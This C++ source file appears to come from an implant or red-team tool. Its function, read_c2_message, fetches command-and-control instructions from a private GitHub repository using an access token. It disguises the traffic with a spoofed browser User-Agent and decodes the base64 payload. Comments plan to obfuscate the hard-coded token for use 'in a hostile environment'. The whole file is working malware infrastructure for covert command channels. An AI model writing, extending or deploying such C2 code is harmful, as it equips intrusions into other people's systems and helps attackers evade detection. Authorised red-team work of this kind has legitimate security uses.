// read_c2_message(std::string file_name) reads and returns the contents of the given file on the C2 GitHub as an std::string. This is done over TLS. The C2 repo is private, and contact relies on the PAT found in PATs.txt until such time as a compile-time obfsucation routine is written

/*
This function returns "REQUEST_FAILED" upon failure, otherwise it will return the content of the C2 file specified as argument 1
*/

#define CPPHTTPLIB_OPENSSL_SUPPORT

#include "grab_read_access_token.h"
#include <sstream>
#include <iostream>
#include <string>
#include "cpp-httplib/httplib.h"
#include <nlohmann/json.hpp>
#include <base64.hpp>
#include "clean-encoding.h"

std::string read_c2_message(std::string file_name) {

    std::string auth_token = grab_read_access_token();          // returns "FAILED_NO_TOKEN" upon failure;
                                                                // PAT.txt won't exist in a hostile environment, so hard code the access token with constexpr compile time obfuscation

    std::ostringstream header_formatted_token_string;           // creating the formatted bearer token needed for the request
    header_formatted_token_string << "token ";
    header_formatted_token_string << auth_token;

    // string that works: token {access_token}
    httplib::Headers headers = {
        { "User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0" },
        { "Authorization", header_formatted_token_string.str() }
    };

    httplib::Client client("https://api.github.com");

    client.enable_server_certificate_verification(true);

    std::cout << "[+] About to make the request" << '\n';

    std::ostringstream resource;
    resource << "/repos/Carnelian-Security/authentication-testing/contents/" << file_name;

    auto response = client.Get(resource.str(), headers);

    std::cout << "[+] The request has been made to get " << resource.str() << '\n';

    if (response && response->status == 200) {
        std::cout << "[+] HTTP status code: " << response->status << '\n';

        nlohmann::json_abi_v3_11_3::json parsed_string = nlohmann::json::parse(response->body);

        std::string encoded_string = parsed_string["content"];

        std::string decoded_string = base64::from_base64(base64_remove_newlines(encoded_string));

        //std::cout << "[+] Decoded string: " << base64::from_base64(base64_remove_newlines(encoded_string)) << '\n';         // it is imperative to clean newlines before decoding!
        std::cout << "[+] Decoded string: " << decoded_string;         // it is imperative to clean newlines before decoding!

        decoded_string.pop_back();

        return decoded_string;

    } else if (response && response->status != 200) {
        std::cout << "[!] Request went through but the response code is not 200" << '\n';
        return "REQUEST_FAILED";
    } else {
        std::cerr << "[!] The request failed: " << response.error() << '\n';
        return "REQUEST_FAILED";
    }
    
}


